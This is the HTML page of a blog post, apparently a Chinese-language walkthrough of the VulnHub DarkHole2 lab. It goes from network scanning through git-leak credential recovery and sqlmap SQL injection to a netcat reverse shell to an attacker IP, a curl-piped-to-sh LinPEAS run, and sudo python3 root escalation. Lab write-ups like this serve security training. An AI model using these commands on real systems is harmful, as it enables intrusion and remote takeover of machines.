@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="VulnHub-DarkHole2Level: Medium-Hard">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-DarkHole2">
+<meta property="og:url" content="http://example.com/2022/01/20/VulnHub-DarkHole2/index.html">
+<meta property="og:site_name" content="Jasontt&#39;s Blog">
+<meta property="og:description" content="VulnHub-DarkHole2Level: Medium-Hard">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194130792.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194759005.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120195541319.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120201405775.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120202700671.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120203339458.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204122563.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204423858.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205214748.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205317753.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120210247227.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124162955923.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124163212182.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164135872.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164601654.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124171444067.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/DarkHole2.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124173906401.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174252068.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174353936.png">
+<meta property="article:published_time" content="2022-01-20T09:55:21.000Z">
+<meta property="article:modified_time" content="2022-01-24T10:04:33.026Z">
+<meta property="article:author" content="Jason Tu">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="vulhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194130792.png">
+
+
+<link rel="canonical" href="http://example.com/2022/01/20/VulnHub-DarkHole2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/01/20/VulnHub-DarkHole2/","path":"2022/01/20/VulnHub-DarkHole2/","title":"VulnHub-DarkHole2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulnHub-DarkHole2 | Jasontt's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Jasontt's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#VulnHub-DarkHole2"><span class="nav-number">1.</span> <span class="nav-text">VulnHub-DarkHole2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#netdiscover"><span class="nav-number">1.1.1.</span> <span class="nav-text">netdiscover</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap"><span class="nav-number">1.1.2.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#git-dumper"><span class="nav-number">1.1.3.</span> <span class="nav-text">git-dumper</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.</span> <span class="nav-text">SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">反弹Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jason Tu"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">Jason Tu</p>
+  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">Jiang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/yunqian2017" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017" rel="noopener" target="_blank">Openg</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/VulnHub-DarkHole2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="Jason Tu">
+      <meta itemprop="description" content="一只谦虚的兔子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jasontt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulnHub-DarkHole2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-20 17:55:21" itemprop="dateCreated datePublished" datetime="2022-01-20T17:55:21+08:00">2022-01-20</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-01-24 18:04:33" itemprop="dateModified" datetime="2022-01-24T18:04:33+08:00">2022-01-24</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="VulnHub-DarkHole2"><a href="#VulnHub-DarkHole2" class="headerlink" title="VulnHub-DarkHole2"></a>VulnHub-DarkHole2</h1><p><strong>Level: Medium-Hard</strong></p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>本次的环境不同以往的点在于不知道目标的IP，所以先用netdiscover进行网络扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i 192.168.221.0/16</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194130792.png" alt="image-20220120194130792"></p>
+<p>发现目标IP为<strong>192.168.221.133</strong></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120194759005.png" alt="image-20220120194759005"></p>
+<p>开放22、80端口，存在<strong>http-git</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120195541319.png" alt="image-20220120195541319"></p>
+<p>直接访问发现<strong>Git泄露</strong></p>
+<h3 id="git-dumper"><a href="#git-dumper" class="headerlink" title="git-dumper"></a>git-dumper</h3><p>类似的工具都行，主要是把.git目录down下来</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120201405775.png" alt="image-20220120201405775"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git diff a4d900a8d85e8938d3601f3cef113ee293028e10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120202700671.png" alt="image-20220120202700671"></p>
+<p>用git命令发现了邮箱以及密码</p>
+<blockquote>
+<p>Email：<a href="mailto:&#108;&#x75;&#115;&#x68;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#108;&#x75;&#115;&#x68;&#64;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>Password：321</p>
+</blockquote>
+<p>通过备份下来的文件可知存在登陆界面，利用获得的邮箱密码登录</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120203339458.png" alt="image-20220120203339458"></p>
+<p>对GET参数id进行简单测试猜测可能存在SQL注入</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>Burpsuite</strong>抓包用<strong>sqlmap</strong>跑一下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204122563.png" alt="image-20220120204122563"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test --dbs</span><br><span class="line">sqlmap -r test -D darkhole_2 --table</span><br><span class="line">sqlmap -r test -D darkhole_2 -T ssh --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120204423858.png" alt="image-20220120204423858"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205214748.png" alt="image-20220120205214748"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120205317753.png" alt="image-20220120205317753"></p>
+<p>可以尝试SSH连接了</p>
+<blockquote>
+<p>user：jehad</p>
+<p>password：fool</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220120210247227.png" alt="image-20220120210247227"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>没有可利用脚本</p>
+<p>返回上级目录发现了有另外两个用户<strong>lama</strong>和<strong>losy</strong>，不出意外需要获得它们的权限</p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>找一下受害机上潜在的提权方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<p>从LinePEAS收集到的信息中发现，<strong>losy</strong>用户localhost的9999端口运行了一个php服务</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124162955923.png" alt="image-20220124162955923"></p>
+<p>访问<code>/opt/web</code>目录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124163212182.png" alt="image-20220124163212182"></p>
+<p>进行本地端口转发，这样就可以在本地访问<strong>index.php</strong>，再进行cmd传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jehad@192.168.221.133 -L 9999:localhost:9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164135872.png" alt="image-20220124164135872"></p>
+<p>在<strong>losy</strong>用户目录下找到flag</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124164601654.png" alt="image-20220124164601654"></p>
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>直接反弹shell似乎行不通，用工具对命令进行url编码成功反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.221.128 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124171444067.png" alt="image-20220124171444067"></p>
+<p>可以用python起个bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/home/losy</code>目录下发现了<code>.bash_history</code>查看内容</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/DarkHole2.png" alt="DarkHole2"></p>
+<p>找到了<strong>losy</strong>的密码</p>
+<blockquote>
+<p>losy:gang</p>
+</blockquote>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124173906401.png" alt="image-20220124173906401"></p>
+<p>通过sudo可以使用root权限执行python3，用上面python起bash的命令就可以拿到root权限了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174252068.png" alt="image-20220124174252068"></p>
+<p>flag在<code>/root</code>目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220124174353936.png" alt="image-20220124174353936"></p>
+<p>end</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在渗透中信息收集真的非常重要，第一次用LinPEAS工具，自动化的信息收集确实很方便</p>
+<p>所知反弹shell的方法还是有所欠缺，需要后需加强学习</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/913067492f05">https://www.jianshu.com/p/913067492f05</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/vulhub/" rel="tag"># vulhub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/17/VulnHub-Empire-LupinOne/" rel="prev" title="VulnHub-Empire:LupinOne">
+                  <i class="fa fa-chevron-left"></i> VulnHub-Empire:LupinOne
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
